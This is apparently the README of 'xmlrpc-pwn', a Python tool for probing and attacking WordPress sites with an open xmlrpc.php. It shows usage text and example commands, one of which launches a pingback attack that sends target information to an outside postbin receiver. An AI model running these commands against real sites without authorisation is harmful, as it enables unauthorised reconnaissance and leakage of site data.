`xmlrcp-pwn` is a lightweight python script with zero dependencies that can try multiple attacks against a wordpress when the **xmlrpc.php** is open to interact with. It is important to emphasize that just because it is open for interaction does not mean that it is vulnerable.

# Usage

```bash
usage: main.py [-h] [-d DOMAIN] [-p PINGBACK] [-v]

Interact with xmlrpc.php file on wordpress site
EXAMPLES:
        xmlrpc-pwn -d example.com
        xmlprc-pwn --domain example.com --pingback https://receiver.com:8080
        xmlrc-pwn -d example.es --check-only

options:
  -h,          --help            Show this help message and exit
  -d DOMAIN,   --domain          The target domain you want to interact
  -p PINGBACK, --pingback        Use a pingback attack to retrieve information from the target to your receiver
  -c,          --check-only      Just run a simple check to confirm it is open
  -v,          --version         Show program's version number and exit

Wordpress is leak, insecure and ugly
```

# Examples

## Do a simple check to confirm it is open

```bash
xmlrpc-pwn -d example.com --check-only
```

## Execute a pingback attack to retrieve target information

```bash
xmlrpc-pwn -d example.com --pingback https://www.toptal.com/developers/postbin/b/1682676864221-3461969071067
```
